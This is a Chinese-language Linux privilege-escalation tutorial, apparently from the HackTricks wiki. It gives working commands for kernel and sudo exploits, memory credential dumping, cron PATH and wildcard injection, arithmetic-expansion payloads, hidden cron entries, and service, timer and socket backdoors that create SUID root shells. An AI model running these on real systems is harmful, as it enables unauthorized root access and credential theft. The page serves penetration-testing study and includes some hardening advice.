# Linux 权限提升

{{#include ../../../banners/hacktricks-training.md}}

## 系统信息

### OS 信息

让我们先了解正在运行的 OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你对 `PATH` 变量中的任何文件夹拥有**写入权限**，则可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有用的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel version，并确认是否存在可用于提升权限的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个很好的易受攻击 kernel 列表以及一些已经 **compiled exploits**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
其他可以找到一些 **compiled exploits** 的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的 kernel 版本，可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用于搜索 kernel exploits 的工具包括：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者机器上执行，仅检查 kernel 2.x 的 exploits）

始终**在 Google 中搜索 kernel 版本**，因为你的 kernel 版本可能会记录在某个 kernel exploit 中，这样你就能确认该 exploit 是否有效。

其他 kernel exploitation 技术：

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

根据以下内容中出现的存在漏洞的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用以下 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许未特权的本地用户在 `/etc/nsswitch.conf` 文件从用户可控目录中使用时，通过 sudo `--chroot` 选项将权限提升至 root。<sup>[[28]](#references)[[29]](#references)</sup>

这里有一个用于利用该[漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)的 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)。运行 exploit 前，请确保你的 `sudo` 版本存在漏洞，并且支持 `chroot` 功能。

更多信息请参考原始[漏洞公告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)<sup>[[28]](#references)</sup>

### Sudo 基于主机的规则绕过（CVE-2025-32462）

1.9.17p1 之前的 Sudo（报告的受影响范围：**1.8.8–1.9.17**）可能会使用 `sudo -h <host>` 提供的**用户指定主机名**，而不是**真实主机名**，来评估基于主机的 sudoers 规则。如果 sudoers 在另一台主机上授予了更广泛的权限，你就可以在本地 **spoof** 该主机。<sup>[[29]](#references)</sup>

要求：
- 存在漏洞的 sudo 版本
- 特定于主机的 sudoers 规则（主机既不是当前主机名，也不是 `ALL`）

sudoers 规则示例：
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
通过伪造允许的主机进行利用：
```bash
sudo -h devbox id
sudo -h devbox -i
```
如果 spoofed name 的解析被阻塞，请将其添加到 `/etc/hosts`，或使用日志/配置中已经出现的 hostname，以避免 DNS 查询。

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **HTB 的 smasher2 靶机**，了解如何利用此漏洞的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## 容器逃逸

如果你位于容器内部，请先查看以下 container-security 章节，然后再转向特定于运行时的滥用页面：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## 驱动器

检查**挂载和卸载了什么**、在哪里挂载或卸载，以及原因。如果存在任何已卸载的驱动器，你可以尝试挂载它，并检查其中是否包含私密信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了**任何编译器**。如果需要使用某些 kernel exploit，这会很有用，因为建议在你准备使用它的机器上（或类似机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装的软件包和服务的版本**。也许存在某个旧版本的 Nagios（例如），可以被利用来提升权限……\
建议手动检查较可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你拥有该机器的 SSH 访问权限，也可以使用 **openVAS** 检查机器内部安装的软件是否已过时或存在漏洞。

> [!NOTE] > _请注意，这些命令会显示大量信息，其中大部分可能没有用。因此，建议使用 OpenVAS 或类似的应用程序来检查已安装的软件版本是否容易受到已知 exploits 的攻击_

## 进程

查看正在执行的**进程**，并检查是否有进程拥有**超出其应有范围的权限**（例如，某个 tomcat 是否由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有可能正在运行的 [**electron/cef/chromium debuggers**，你可以滥用它来提升权限](../../software-information/electron-cef-chromium-debugger-abuse.md)。**Linpeas** 会通过检查进程命令行中的 `--inspect` 参数来检测它们。\
还要**检查你对进程二进制文件所拥有的权限**，你可能可以覆盖某些文件。

### 跨用户父子进程链

子进程与其父进程由**不同用户**运行，并不一定是恶意行为，但这是一个有用的**分流信号**。某些用户切换是正常的（`root` 启动 service user、登录管理器创建会话进程），但异常的进程链可能暴露 wrappers、debug helpers、persistence 或薄弱的运行时信任边界。

快速检查：
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
如果发现一条令人意外的链路，请检查父进程的命令行，以及所有会影响其行为的文件（`config`、`EnvironmentFile`、辅助脚本、工作目录、可写参数）。在多个真实的 privesc 路径中，子进程本身不可写，但**由父进程控制的 config**或辅助链路可以被修改。

### 已删除的可执行文件和已删除但仍处于打开状态的文件

运行时产物在**删除后**通常仍可访问。这对于权限提升以及从已打开敏感文件的进程中恢复证据都很有用。

检查已删除的可执行文件：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
如果 `/proc/<PID>/exe` 指向 `(deleted)`，说明该进程仍在运行内存中的旧二进制映像。这是一个值得调查的强烈信号，因为：

- 被删除的可执行文件可能包含有价值的字符串或凭据
- 正在运行的进程可能仍暴露有用的文件描述符
- 被删除的特权二进制文件可能表明最近发生过篡改或清理尝试

全局收集已删除但仍处于打开状态的文件：
```bash
lsof +L1
```
如果发现有趣的文件描述符，直接恢复它：
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
当某个进程仍然打开着已删除的 secret、script、database export 或 flag file 时，这尤其有价值。

### Process monitoring

你可以使用 [**pspy**](https://github.com/DominicBreuker/pspy) 等工具来监控进程。这对于识别频繁执行的易受攻击进程，或在满足一组要求时执行的易受攻击进程，非常有用。

### Process memory

某些服务器服务会将 **credentials 以明文形式保存于内存中**。\
通常，你需要 **root privileges** 才能读取属于其他用户的进程内存，因此当你已经是 root 并希望发现更多 credentials 时，这通常更有用。\
不过请记住，**作为普通用户，你可以读取自己拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器**默认不允许 ptrace**，这意味着你无法 dump 属于你的非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：只要具有相同的 uid，所有进程都可以被 debug。这是 ptracing 的经典工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被 debug。
> - **kernel.yama.ptrace_scope = 2**：只有管理员可以使用 ptrace，因为这要求具备 CAP_SYS_PTRACE capability。
> - **kernel.yama.ptrace_scope = 3**：不能使用 ptrace 对任何进程进行 trace。设置后，需要重启才能再次启用 ptracing。

#### GDB

如果你可以访问某个 FTP 服务的内存（例如），就可以获取其 Heap，并在其中搜索 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示内存如何映射到该进程的**虚拟地址空间中；它还显示**每个映射区域的权限**。**mem** 伪文件**暴露进程自身的内存**。通过 **maps** 文件，我们可以知道哪些**内存区域可读**以及它们的偏移量。利用这些信息，我们可以**定位到 mem 文件中的相应位置，并将所有可读区域转储**到文件中。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统**物理**内存的访问，而不是虚拟内存。可以使用 /dev/kmem 访问内核的虚拟地址空间。\
通常，只有 **root** 和 **kmem** 组可以读取 `/dev/mem`。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump 是 Sysinternals 工具套件中经典 ProcDump 工具的 Linux 重制版。可从 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

要 dump 一个进程的内存，可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump)（需要 root）- \_你可以手动移除 root 要求，并 dump 由你拥有的进程
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root）

### 从进程内存中获取 Credentials

#### 手动示例

如果发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 进程（请参阅前面的章节，了解 dump 进程内存的不同方法），并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将从**内存**和一些**知名文件**中**窃取明文凭据**。要正常工作，它需要 root 权限。

| 功能                                             | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM 密码（Kali Desktop、Debian Desktop）          | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（活动 FTP 连接）                           | vsftpd               |
| Apache2（活动 HTTP Basic Auth 会话）              | apache2              |
| OpenSSH（活动 SSH 会话 - Sudo 使用）              | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

如果 Web “Crontab UI”面板（alseambusher/crontab-ui）以 root 身份运行且仅绑定到 loopback，仍然可以通过 SSH 本地端口转发访问它，并创建一个特权 job 来提升权限。<sup>[[1]](#references)[[4]](#references)</sup>

Typical chain
- 发现仅限 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm：使用 `ss -ntlp` / `curl -v localhost:8000`
- 在运维相关 artifacts 中查找 credentials：
- 使用 `zip -P <password>` 的 backups/scripts
- 暴露 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` 的 systemd unit
- 建立 tunnel 并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行（生成 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并限制为最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅 root 可读的 EnvironmentFile
- 为按需执行的 job 启用 audit/logging

检查是否有任何 scheduled job 存在漏洞。也许你可以利用某个由 root 执行的 script（wildcard vuln？可以修改 root 使用的 files？使用 symlinks？在 root 使用的 directory 中创建特定 files？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
如果使用 `run-parts`，请检查哪些名称实际上会被执行：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
这可以避免误报。只有当你的 payload 文件名符合本地 `run-parts` 规则时，可写的周期性目录才有用。

### Cron 路径

例如，在 _/etc/crontab_ 中可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意，用户 "user" 对 /home/user 具有写入权限_）

如果在此 crontab 中，root 用户尝试执行某个命令或脚本，但未设置路径。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获取 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带有通配符的脚本（Wildcard Injection）

如果由 root 执行的脚本在命令中包含“**\***”，你可以利用这一点来实现非预期操作（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面带有路径，例如** _**/some/path/\***_ **，则不存在漏洞（即使是** _**./\***_ **也不例外）。**

阅读以下页面，了解更多 wildcard exploitation 技巧：


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 会在算术求值之前，对 ((...))、$((...)) 和 let 中的内容执行 parameter expansion 和 command substitution。如果 root cron/parser 读取不可信的日志字段，并将其传入 arithmetic context，攻击者就可以注入 command substitution $(...)，在 cron 运行时以 root 身份执行命令。<sup>[[22]](#references)</sup>

- 工作原理：在 Bash 中，expansion 按以下顺序执行：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。因此，类似 `$(/bin/bash -c 'id > /tmp/pwn')0` 的值会先被替换（同时执行命令），随后剩余的数字 `0` 会用于算术运算，使脚本可以无错误地继续执行。

- 典型的 vulnerable pattern：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation：将攻击者控制的文本写入被解析的日志，使 numeric-looking field 包含 command substitution，并以数字结尾。确保你的命令不会向 stdout 输出内容（或将其重定向），这样 arithmetic 才能保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果**你可以修改由 root 执行的 cron script**，就可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个**你拥有完全访问权限的目录**，那么删除该目录并**创建一个指向其他目录的符号链接目录**可能会有用，从而执行由你控制的脚本
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink 验证与更安全的文件处理

审查按路径读取或写入文件的高权限脚本/二进制文件时，请确认其如何处理 links：

- `stat()` 会跟随 symlink，并返回目标的 metadata。
- `lstat()` 返回 link 本身的 metadata。
- `readlink -f` 和 `namei -l` 有助于解析最终目标，并显示每个路径组件的 permissions。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
对于 defenders/developers，更安全的防范 symlink tricks 的模式包括：

- `O_EXCL` 与 `O_CREAT`：如果路径已存在则失败（阻止攻击者预先创建 links/files）。
- `openat()`：相对于受信任的 directory file descriptor 执行操作。
- `mkstemp()`：使用安全权限以原子方式创建 temporary files。

### 带有可写 payloads 的 Custom-signed cron binaries
Blue teams 有时会通过导出 custom ELF section 并在执行 cron-driven binaries 前 grep vendor string 来“sign”它们。如果该 binary 可被组写入（例如 `/opt/AV/periodic-checks/monitor` 的所有者为 `root:devs 770`），并且你能 leak signing material，就可以伪造该 section 并劫持 cron task：<sup>[[2]](#references)</sup>

1. 使用 `pspy` 捕获 verification flow。在 Era 中，root 执行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后执行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该 file。
2. 使用泄露的 key/config（来自 `signing.zip`）重新创建预期的 certificate：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建 malicious replacement（例如 drop 一个 SUID bash、添加你的 SSH key），并将 certificate 嵌入 `.text_sig`，使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留 execute bits 的同时覆盖 scheduled binary：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron run；当 naive signature check 成功后，你的 payload 将以 root 身份运行。

### Frequent cron jobs

你可以监控 processes，搜索每 1、2 或 5 分钟执行一次的 processes。也许你可以利用它来提升 privileges。

例如，要**每 0.1s 监控 1 分钟**、**按执行次数较少的 commands 排序**，并删除执行次数最多的 commands，可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监控并列出每个启动的进程）。

### 保留攻击者设置的模式位的 root 备份（pg_basebackup）

如果一个由 root 拥有的 cron 使用 `pg_basebackup`（或任何递归复制操作）处理一个你可以写入的数据库目录，你就可以植入一个 **SUID/SGID binary**，该文件会以相同的模式位被重新复制到备份输出目录中，并且所有者变为 **root:root**。<sup>[[26]](#references)</sup>

典型的发现流程（作为低权限 DB 用户）：
- 使用 `pspy` 查找类似以下内容的 root cron：`/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`，每分钟执行一次。
- 确认源 cluster（例如 `/var/lib/postgresql/14/main`）对你可写，并且任务执行后目标目录（`/opt/backups/current`）的所有者变为 root。

Exploit：
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
之所以可行，是因为 `pg_basebackup` 在复制 cluster 时会保留文件 mode bits；当由 root 执行时，目标文件会继承 **root 所有权 + 攻击者选择的 SUID/SGID**。任何类似的特权 backup/copy routine，只要保留权限并将文件写入可执行位置，就存在漏洞。

### 隐形 cron jobs

可以创建一个 cronjob：**在注释后放置一个回车符**（不包含换行符），这样 cron job 仍然能够正常工作。示例（注意其中的回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
要检测这类隐蔽入口，请使用能够显示控制字符的工具检查 cron 文件：
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件；如果可以，你**可能可以修改它**，使其在服务被**启动**、**重启**或**停止**时**执行**你的 **backdoor**（可能需要等待机器重启）。\
例如，在 .service 文件中添加你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请注意，如果你对服务所执行的二进制文件具有**写权限**，可以将它们修改为 backdoor，这样服务重新执行时就会执行这些 backdoor。

### systemd PATH - 相对路径

你可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现自己可以对路径中的任何文件夹进行 **write**，那么可能可以 **escalate privileges**。你需要在 service configurations 文件中查找所使用的 **relative paths**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可以写入的 systemd PATH 文件夹中创建一个与相对路径二进制文件同名的**可执行文件**，当服务被要求执行存在漏洞的操作（**启动**、**停止**、**重新加载**）时，你的**后门将被执行**（非特权用户通常无法启动/停止服务，但请检查是否可以使用 `sudo -l`）。

**通过 `man systemd.service` 了解更多有关服务的信息。**

## **Timers**

**Timers** 是名称以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。由于内置支持日历时间事件和单调时间事件，并且可以异步运行，因此 **Timers** 可作为 cron 的替代方案。

你可以使用以下命令枚举所有 timers：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改定时器，就可以让它执行 `systemd.unit` 的某些实体（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中，你可以了解 Unit 是什么：

> 当此 timer 到期时要激活的 unit。该参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为与 timer unit 同名但不包含后缀的 service。（见上文。）建议将被激活的 unit 名称与 timer unit 的名称设置为相同，仅后缀不同。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），该 unit **正在执行一个可写的 binary**
- 找到某个 systemd unit，该 unit **正在执行相对路径**，并且你对 **systemd PATH** 拥有**可写权限**（以冒充该 executable）

**通过 `man systemd.timer` 了解有关 timers 的更多信息。**

### **启用 Timer**

要启用 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
请注意，通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建符号链接来**激活** **timer**。

## Sockets

Unix Domain Sockets (UDS) 支持在客户端-服务器模型中，让同一台或不同机器上的**进程通信**。它们利用标准 Unix 描述符文件进行计算机间通信，并通过 `.socket` 文件进行设置。<sup>[[14]](#references)</sup>

可以使用 `.socket` 文件配置 Sockets。

**通过 `man systemd.socket` 了解更多关于 Sockets 的信息。** 在此文件中，可以配置以下几个有趣的参数：

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项各不相同，但总体上用于**指示 socket 将在哪里监听**（AF_UNIX socket 文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`：接受布尔值参数。如果为 **true**，则会为**每个传入连接生成一个 service instance**，并且只有连接 socket 会传递给它。如果为 **false**，所有监听 socket 本身都会**传递给已启动的 service unit**，并且所有连接只会生成一个 service unit。对于 datagram socket 和 FIFO，此值会被忽略，因为单个 service unit 会无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适用于 `Accept=no` 的方式编写新的 daemon。
- `ExecStartPre`、`ExecStartPost`：接受一条或多条命令行，分别在监听的 **socket**/FIFO 被**创建**并绑定**之前**或**之后执行。命令行的第一个 token 必须是绝对文件名，后面跟随进程所需的参数。
- `ExecStopPre`、`ExecStopPost`：其他**命令**，分别在监听的 **socket**/FIFO 被**关闭**并移除**之前**或**之后执行。
- `Service`：指定在**传入流量**到达时要**激活**的 **service** unit 名称。此设置仅允许用于 `Accept=no` 的 socket。默认使用与 socket 同名的 service（替换后缀）。在大多数情况下，不需要使用此选项。

### 可写的 .socket 文件

如果找到一个**可写**的 `.socket` 文件，可以在 `[Socket]` 部分的开头**添加**类似以下内容：`ExecStartPre=/home/kali/sys/backdoor`，这样 backdoor 就会在 socket 创建前执行。因此，你**可能需要等待机器重启。**\
_请注意，系统必须正在使用该 socket 文件配置，否则 backdoor 不会执行_

### Socket activation + 可写的 unit 路径（创建缺失的 service）

另一种高影响的错误配置是：

- 一个 `Accept=no` 且包含 `Service=<name>.service` 的 socket unit
- 被引用的 service unit 缺失
- 攻击者可以写入 `/etc/systemd/system`（或其他 unit 搜索路径）

在这种情况下，攻击者可以创建 `<name>.service`，然后向该 socket 触发流量，使 systemd 以 root 身份加载并执行新的 service。

快速流程：
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
